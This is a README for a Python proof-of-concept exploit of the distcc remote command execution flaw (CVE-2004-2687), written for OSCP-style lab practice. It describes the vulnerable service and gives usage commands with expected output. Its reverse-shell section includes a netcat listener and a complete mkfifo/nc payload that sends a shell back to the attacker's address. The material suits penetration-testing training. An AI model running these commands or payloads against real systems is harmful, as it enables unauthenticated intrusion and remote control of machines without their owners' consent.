# distcc RCE PoC (CVE-2004-2687)

This repository contains a **simple and reliable Proof of Concept (PoC)** for exploiting a **Remote Command Execution (RCE)** vulnerability in **distcc** (CVE-2004-2687).

This PoC was written and tested in an **OSCP-style lab environment**, with the goal of keeping exploitation **realistic, minimal, and reproducible**, just like during real penetration tests or certification exams.

---

## Vulnerability Overview
- **Service:** distccd  
- **Port:** 3632/tcp  
- **Vulnerability:** Unauthenticated Remote Command Execution  
- **CVE:** CVE-2004-2687  
- **Impact:** Remote command execution as the `daemon` user  

The issue exists due to insecure handling of compilation job requests sent to the distcc daemon, allowing attackers to inject arbitrary commands without authentication.

---

## PoC Characteristics
- Minimal Python implementation
- No external dependencies
- Uses the native distcc protocol
- Tested against known vulnerable Linux targets
- Designed with **OSCP / PEN-200 mindset**
- Does **not** rely on Metasploit

---

## Usage

### Command execution test

python3 distcc_rce.py <target_ip> "id"

Example:
python3 distcc_rce.py 10.10.10.3 "id"

Expected output:
uid=1(daemon) gid=1(daemon) groups=1(daemon)

## Reverse shell example

### Start a listener on your machine:
nc -lvnp 4444

### Run the exploit:
python3 distcc_rce.py <target_ip> "rm -f /tmp/f; mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc <your_ip> 4444 > /tmp/f"

## Notes:
- When spawning a reverse shell, the script may not return output.
- This is expected, as the shell keeps the connection open.
- Commands are executed as the daemon user
- Privilege escalation is required to obtain root access
- Modern systems are not affected
- Intended for controlled lab environments only

## Tested Environment
- Target OS: Linux (2.6.x kernel)
- distcc: vulnerable versions (< 2.18)
- Python: 3.x
- Lab: OSCP-style vulnerable machine

## Legal Disclaimer
- This project is intended for educational purposes and authorized security testing only.
- Do not use this code against systems you do not own or do not have explicit permission to test.
- The author is not responsible for misuse or damage caused by this code.

## Author

Danilo Barreto

GitHub: https://github.com/danilo-sec

## Focus areas:
- Offensive Security
- OSCP / PEN-200 preparation
- Red Team & Penetration Testing
